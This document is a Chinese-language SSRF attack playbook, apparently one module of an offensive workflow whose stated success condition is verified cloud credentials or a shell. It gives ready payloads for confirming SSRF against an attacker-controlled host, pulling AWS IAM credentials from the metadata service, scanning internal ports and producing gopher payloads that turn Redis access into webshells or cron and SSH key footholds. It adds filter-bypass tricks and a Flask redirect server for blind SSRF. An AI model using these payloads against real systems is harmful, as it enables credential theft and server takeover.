# SSRF

> **TECH：** 服务端出站请求 → 元数据 / 内网 / gopher 执行
> **成功：** 云凭据可校验，或内网服务被打到执行/shell
> 发现的云密钥校验后候选 `/cloud-recon`，不要在这里做 IAM 提权。

## SSRF 服务端请求伪造

场景：URL预览、图片抓取(?image=)、webhook、导入远程文件、PDF生成、SSO回调(?redirect=)、代理(?url=)。

### 确认SSRF（OOB）

```
# 攻击机起监听
python3 -m http.server 或 interactsh-client

# 参数填攻击机地址
?url=http://ATTACKER-IP/ssrftest

# 收到请求且来源IP=目标服务器 → 确认SSRF
```

### 云元数据（云环境最高价值）

```
# AWS
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → 返回角色名，再取:
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<角色名>
# → AccessKeyId / SecretAccessKey / Token

# GCP（需特殊头，SSRF通常无法设置，但有时可以）
?url=http://metadata.google.internal/computeMetadata/v1/
```

### 内网探测

```
# 端口扫描（据响应时间/长度/报错差异判断开放）
?url=http://127.0.0.1:6379/
?url=http://127.0.0.1:8080/
?url=http://10.0.0.1:445/
```

### gopher协议（打非HTTP内网服务）

```
# 用gopherus工具生成
gopherus --exploit redis       # 写webshell/计划任务
gopherus --exploit mysql       # 执行SQL
gopherus --exploit smtp        # 发邮件

# 把生成的 gopher://... 填进SSRF参数
```

### 绕过过滤

```
# 127.0.0.1被屏蔽
127.1
0.0.0.0
[::]
2130706433                     # 十进制
0x7f000001                     # 十六进制

# 白名单只认某域名
http://内网IP@白名单域名
http://白名单域名.attacker.com

# 169.254.169.254被屏蔽
短链/302重定向到它
DNS rebinding
```

---

## Blind SSRF：从“收到回连”到可利用 Oracle

Blind SSRF 只收到 OAST 回连时，不要停在“存在 SSRF”。继续判断服务器的重定向处理、错误行为和协议支持是否能把 blind primitive 变成可利用链。

### Redirect handling

准备攻击者控制的重定向端点：

```python
# redirect.py
from flask import Flask, redirect, request
app = Flask(__name__)

@app.route('/r')
def r():
    return redirect(request.args.get('to','http://127.0.0.1:1/'), code=302)

app.run(host='0.0.0.0', port=8000)
```

```bash
python3 redirect.py
```

目标：

```text
?url=http://ATTACKER:8000/r?to=http://127.0.0.1:8080/admin
```

比较：

```text
302是否被跟随
最终status/长度/时间
超时 vs connection refused
错误页是否包含最终URL/内部响应线索
```

**不要假定重定向一定能“直接回显内网内容”。** 研究型 redirect-loop 技术依赖具体 HTTP client/错误处理；只有目标实测出现可重复 oracle 才继续。

### Blind SSRF port oracle

```text
127.0.0.1:1       → closed baseline
127.0.0.1:22      → candidate
127.0.0.1:80      → candidate
127.0.0.1:3000    → candidate
127.0.0.1:6379    → candidate
```

记录每个端口多次响应时间和错误类型，避免把网络抖动当开放端口。

---

## SSRF → Redis

只有 **Web SSRF 把你带到 Redis** 时才属于本文件；扫描直接发现 6379 属于 `/recon`。

### 先判断协议能力

```text
HTTP-only SSRF            → 通常只能碰HTTP网关/错误行为
支持gopher/raw TCP        → 才能发送完整RESP命令
可控headers/body但不raw   → 根据目标代理实现判断
```

使用 Gopherus 生成 payload 时：

```bash
gopherus --exploit redis
```

但生成 payload 前必须意识到现代 Redis 可能存在：

```text
AUTH
ACL user
命令级ACL
CONFIG / MODULE / REPLICAOF 被禁
protected-mode / bind
```

所以：

```text
SSRF reaches Redis
    ↓
能否无认证执行基础命令？
    ↓
AUTH/ACL?
    ↓
当前上下文允许哪些命令？
    ↓
选择可行的写文件/复制/模块/应用数据链
```

不要沿用“Redis可达 = CONFIG SET dir 一定可用”的旧教程判断。

### 目标是 Shell，不是 Redis 控制本身

```text
Redis primitive
    ├─ 写WebRoot → WebShell
    ├─ 可控计划任务/authorized_keys（仅环境允许时）
    ├─ replication/module primitive（强版本/权限依赖）
    └─ 只能读写应用数据 → 继续寻找Web组合链
```

拿到服务器 Shell → `/web-attack COMPLETE`。

---

## SSRF 协议/后端路由

```text
SSRF
├─ HTTP/HTTPS → internal admin/API/cloud metadata
├─ Redis      → 本文件 Redis 分支
├─ MySQL      → 若是可控Web“数据库连接功能”，优先 server-side-client-abuse.md
├─ SMTP       → 邮件/重置链
└─ file://    → 本地文件读取（客户端实现允许时）
```
